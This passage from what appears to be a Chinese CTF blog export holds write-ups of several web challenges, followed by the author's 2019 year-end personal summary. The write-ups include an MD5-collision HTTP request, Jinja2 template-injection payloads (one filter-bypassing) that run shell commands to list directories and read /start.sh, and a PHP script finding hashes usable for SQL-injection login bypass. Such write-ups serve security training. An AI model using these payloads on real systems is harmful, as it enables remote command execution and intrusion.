m&#x3D;a&amp;n&#x3D;1 HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 183.129.189.60:10004</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 2337</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;183.129.189.60:10004</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;183.129.189.60:10004&#x2F;?val1&#x3D;s878926199a&amp;val2&#x3D;s155964671a&amp;val3&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&amp;val4&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&amp;val5&#x3D;%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%12%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%7B%F9%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%CA%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%9D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%2C%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%C3%0F%93%72%5C&amp;val6&#x3D;%39%98%EB%F3%ED%EC%0F%45%C0%89%DD%13%77%E0%88%34%41%BF%20%0B%2B%1B%D8%D0%40%5A%7A%6E%52%92%AF%C8%5B%FD%E4%F5%E2%2A%EA%FC%CB%25%63%59%98%7B%78%54%24%A1%35%20%A5%2A%D6%22%35%04%B2%74%01%03%9E%F7%08%01%88%BA%03%88%01%09%65%96%5D%D2%A6%A2%3B%FF%AF%97%3D%88%50%1C%13%DA%49%B3%20%00%3A%60%88%E7%D7%B3%28%58%AF%04%6C%FC%F5%FE%0D%93%42%70%00%BD%EA%CE%D1%14%B4%B1%8E%47%8D%AD%2E%E5%2D%64%1D%3A&amp;val7&#x3D;%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%92%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%FB%F8%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%4A%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%1D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%AC%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%43%0F%93%72%5C&amp;m[]&#x3D;8c8d357b5e872bbacd45197626bd5759&amp;n[]&#x3D;523af537946b79c4f8369ed39ba78605</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br><span class=\"line\">val5&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&amp;val6&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&amp;val7&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&amp;a&#x3D;byGcY&amp;b&#x3D;aOtm2</span><br></pre></td></tr></table></figure>\n\n<p>即可拿到flag</p>\n<p><a href=\"[http://www.gtfly.top/2019/04/07/%E6%8E%98%E5%AE%89%E6%9D%AFwp.html#audit](http://www.gtfly.top/2019/04/07/掘安杯wp.html#audit)\">参考链接</a></p>\n<h1 id=\"easyflask1\"><a href=\"#easyflask1\" class=\"headerlink\" title=\"easyflask1\"></a>easyflask1</h1><p>给出提示，应该是ssti</p>\n<p>在404页面注入</p>\n<p><img src=\"/pic/123.png\" alt=\"\"></p>\n<p>经过测试过滤了<code>-</code>,<code>.</code>。</p>\n<p>参考链接<a href=\"https://fireshellsecurity.team/asisctf-fort-knox\" target=\"_blank\" rel=\"noopener\">https://fireshellsecurity.team/asisctf-fort-knox</a></p>\n<p>操作</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;&#39;.__class__.__mro__[1].__subclasses__()[&#39;&#39;&#39;找到warnings.catch_warnings&#39;&#39;&#39;].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;subprocess&#39;).check_output(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>\n\n<p>114师傅的payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">##payload不需要这么长，可以连续格式化字符串，也可以只把_和.用格式化字符串替代</span><br><span class=\"line\">#没找到flag，先看目录，发现start.sh可读</span><br><span class=\"line\">&#123;&#123;&#39;&#39;[&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;mro&#39;]()[1][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](101)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)]()[65][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](103)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](109)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](112)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](114)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)](&#39;subprocess&#39;)[&#39;check&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;output&#39;]([&#39;ls&#39;,&#39;&#x2F;&#39;])&#125;&#125;</span><br><span class=\"line\">#读取start.sh中存在sed -i &quot;s&#x2F;1ad0633b78d14695b04f105c14674b0d4&#x2F;$1&#x2F;g&quot; &#x2F;flag\\n</span><br><span class=\"line\">&#123;&#123;&#39;&#39;[&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;mro&#39;]()[1][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](101)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)]()[231][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](103)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](109)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](112)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](114)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)](&#39;subprocess&#39;)[&#39;check&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;output&#39;]([&#39;cat&#39;,&#39;&#x2F;start&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](46)+&#39;sh&#39;])&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"HashIsTrue\"><a href=\"#HashIsTrue\" class=\"headerlink\" title=\"HashIsTrue\"></a>HashIsTrue</h1><p>给了提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">注意如下题目内容：$pw &#x3D; hash(&quot;whirlpool&quot;,$pass,true); $sql &#x3D; &quot;select * from user where username&#x3D;&#39;$user&#39; and password&#x3D;&#39;$pw&#39;&quot;;</span><br></pre></td></tr></table></figure>\n\n<p> hash(“whirlpool”,$pass,true)当hash函数开启true时，会返回字符串，而不是16进制。</p>\n<p>可以制造MD5后的包含‘= ’ (没有想通)</p>\n<p>编写脚本参考着114师傅</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">for($i&#x3D;0;;$i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $pass&#x3D;$i;</span><br><span class=\"line\">    $pw &#x3D; hash(&quot;whirlpool&quot;,$pass,true);</span><br><span class=\"line\">    if(preg_match(&#39;&#x2F;\\&#39;&#x3D;\\&#39;&#x2F;&#39;,$pw ))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo $i;</span><br><span class=\"line\">        echo urldecode(&#39;%09&#39;);</span><br><span class=\"line\">        echo $pw;</span><br><span class=\"line\">        echo urldecode(&#39;%0a&#39;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>"},{"title":"年末总结","date":"2019-12-31T15:31:39.000Z","encrypt":"enable","enc_pwd":"7b7a53e239400a13bd6be6c91c4f6c4e","_content":"\n## 年末总结\n\n### 1月\n\n月初这个时候应该快要放假，但是自己已经在家，因为一些原因直接回去了，没有参加学校的考试。在家里从头学了一遍汇编。虽然开了汇编课程，但是上了课与学没没有是两回事！！跟着视频一边看一边做。\n\n<!--more-->\n\n### 2月\n\n二月是颓废的一个月，什么都没有学。只是在家里睡觉，吃饭，走亲戚。自己觉得过年其实也就那样吧，越大就月不太想过年。比开学时间早了一周去学校。\n\n### 3月\n\n月初，开学了。也是准备考试（补考）的时候，开学第二周考试，两天之内考8门考试。但是自己一点也不慌，知道自己什么水平，每次都是及格边缘，不会挂科，也不会好到哪里去。考试过后就是每天的上课。\n\n### 4月\n\n4月也是比较闲的一个月。除了每天的上课，就是逛逛网页，有什么新东西，还有就是和别人聊聊天。这个月要举办ACM校赛，要负责准备工作（卑微的工作人员）。\n\n###  5月\n\n参加了一个老师推荐的比赛，初赛是答题，复赛交作品，决赛完善作品。初赛因为实验室所在大楼举办计算机登记考试，不让进去！！只好在网吧参加考试，只拿到了56分，本以为凉了，但是破天荒的进入了复赛！复赛名单出来还是挺开心的。\n\n### 6月\n\n参加了老师的一个智能家居的项目。前期是看论文，看看这个方向的进展。大部分都是英文的看得有一点点头痛。后面因为队友也不太给力，自己也。。。。。。就这样凉了。参加了四六级考试（裸考）。考前不复习，考试到达考场就不想去了。还是硬着头皮进去了，听力就和听天书似的。\n\n###  7月\n\n月初又是考试周， 还要准备5月份那个比赛的复赛。选择的方向是SDN，虽然会一点数通，但是这玩意听都没有听过。开始在思科的官网找资料学习，用队友的电脑搭建了一个EVE-NG使用思科设备进行测试。队友可能是忙着其他事情去了吧，也没有这么出力。自己能力也不足，还不会PYTHON。到了提交作品那一天什么东西都没有交上去。\n\n### 8月\n\n8月放假在家。因为不会python吃了很多亏，花了一个多月学习PYTHON。学了之后是真的好用!!\n\n### 9月\n\n又是开学，这个月开始密集打CTF比赛。这个月是护网杯、N1CTF只会写签到题。事后也没有跟着复现，错过了很多东西。\n\n### 10月\n\n这个月也是打打比赛。不过认识了一个其他学校过来的同学，之前也是打这类比赛的，比较兴奋，因为打比赛有了队友了。在这个月认识了一个叫十月的小姐姐，还加入了一个组织。加入之后开始有了方向，算是转折点吧。有更多来着他校的厉害队友一起打比赛，特别特别开心。月底开始准备软考。\n\n### 11月\n\n准备软考，一直在刷题。不过真题也只是刷了几套。这个月还有一个湖湘杯，3号初赛（也是答题）去年复赛都没有进去。9号的软考刚好碰上湖湘杯。今年有幸进入了复赛，9号才晚上开始解题，不过因为水平还是太差，没能进入决赛。去年有一个学长进入了复赛，今天他进入了决赛，看这样子可能明年也许我仅能去决赛划划水了（哈哈哈哈哈）。\n\n### 12月\n\n软考成绩公布，过线了。这个月又有一次四六级，我又参加了（报名特积极，考试不复习可能说的就是自己吧）。这个学期课少，但是要学的东西特别多。特别想要回到大一大二，但是这个是不可能的，只有自己抓紧时间好好学习，少玩，多学，多操作。\n\n### 最后\n\n希望新的一年里可以对自己严格一些，多学点东西。早睡早起!","source":"_posts/年末总结.md","raw":"---\ntitle: 年末总结\ndate: 2019-12-31 23:31:39\ntags:\n - 总结\nencrypt: enable\nenc_pwd: 7b7a53e239400a13bd6be6c91c4f6c4e\ncategories: \n - 随笔\n---\n\n## 年末总结\n\n### 1月\n\n月初这个时候应该快要放假，但是自己已经在家，因为一些原因直接回去了，没有参加学校的考试。在家里从头学了一遍汇编。虽然开了汇编课程，但是上了课与学没没有是两回事！！跟着视频一边看一边做。\n\n<!--more-->\n\n### 2月\n\n二月是颓废的一个月，什么都没有学。只是在家里睡觉，吃饭，走亲戚。自己觉得过年其实也就那样吧，越大就月不太想过年。比开学时间早了一周去学校。\n\n### 3月\n\n月初，开学了。也是准备考试（补考）的时候，开学第二周考试，两天之内考8门考试。但是自己一点也不慌，知道自己什么水平，每次都是及格边缘，不会挂科，也不会好到哪里去。考试过后就是每天的上课。\n\n### 4月\n\n4月也是比较闲的一个月。除了每天的上课，就是逛逛网页，有什么新东西，还有就是和别人聊聊天。这个月要举办ACM校赛，要负责准备工作（卑微的工作人员）。\n\n###  5月\n\n参加了一个老师推荐的比赛，初赛是答题，复赛交作品，决赛完善作品。初赛因为实验室所在大楼举办计算机登记考试，不让进去！！只好在网吧参加考试，只拿到了56分，本以为凉了，但是破天荒的进入了复赛！复赛名单出来还是挺开心的。\n\n### 6月\n\n参加了老师的一个智能家居的项目。前期是看论文，看看这个方向的进展。大部分都是英文的看得有一点点头痛。后面因为队友也不太给力，自己也。。。。。。就这样凉了。参加了四六级考试（裸考）。考前不复习，考试到达考场就不想去了。还是硬着头皮进去了，听力就和听天书似的。\n\n###  7月\n\n月初又是考试周， 还要准备5月份那个比赛的复赛。选择的方向是SDN，虽然会一点数通，但是这玩意听都没有听过。开始在思科的官网找资料学习，用队友的电脑搭建了一个EVE-NG使用思科设备进行测试。队友可能是忙着其他事情去了吧，也没有这么出力。自己能力也不足，还不会PYTHON。到了提交作品那一天什么东西都没有交上去。\n\n### 8月\n\n8月放假在家。因为不会python吃了很多亏，花了一个多月学习PYTHON。学了之后是真的好用!!\n\n### 9月\n\n又是开学，这个月开始密集打CTF比赛。这个月是护网杯、N1CTF只会写签到题。事后也没有跟着复现，错过了很多东西。\n\n### 10月\n\n这个月也是打打比赛。不过认识了一个其他学校过来的同学，之前也是打这类比赛的，比较兴奋，因为打比赛有了队友了。在这个月认识了一个叫十月的小姐姐，还加入了一个组织。加入之后开始有了方向，算是转折点吧。有更多来着他校的厉害队友一起打比赛，特别特别开心。月底开始准备软考。\n\n### 11月\n\n准备软考，一直在刷题。不过真题也只是刷了几套。这个月还有一个湖湘杯，3号初赛（也是答题）去年复赛都没有进去。9号的软考刚好碰上湖湘杯。今年有幸进入了复赛，9号才晚上开始解题，不过因为水平还是太差，没能进入决赛。去年有一个学长进入了复赛，今天他进入了决赛，看这样子可能明年也许我仅能去决赛划划水了（哈哈哈哈哈）。\n\n### 12月\n\n软考成绩公布，过线了。这个月又有一次四六级，我又参加了（报名特积极，考试不复习可能说的就是自己吧）。这个学期课少，但是要学的东西特别多。特别想要回到大一大二，但是这个是不可能的，只有自己抓紧时间好好学习，少玩，多学，多操作。\n\n### 最后\n\n希望新的一年里可以对自己严格一些，多学点东西。早睡早起!","slug":"年末总结","published":1,"updated":"2019-12-31T15:31:39.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfnu0021pk7e7qv7eusp","content":"<script src=/js/crypto-js.js></script>\n<script>\nfunction doDecrypt (pwd, onError) {\n\tconsole.log('in doDecrypt');\n\tconst txt = document.getElementById('enc_content').innerHTML;\n\tlet plantext;\n\ttry {\n\t\tconst bytes = CryptoJS.AES.decrypt(txt, pwd);\n\t\tvar plaintext = bytes.toString(CryptoJS.enc.Utf8);\n\t} catch(err) {\n\t\tif(onError) {\n\t\t\tonError(err);\n\t\t}\n\t\treturn;\n\t}\n\tdocument.getElementById('enc_content').innerHTML = plaintext;\n\tdocument.getElementById('enc_content').style.display = 'block';\n\tdocument.getElementById('enc_passwd').style.display = 'none';\n\tif(typeof MathJax !== 'undefined') 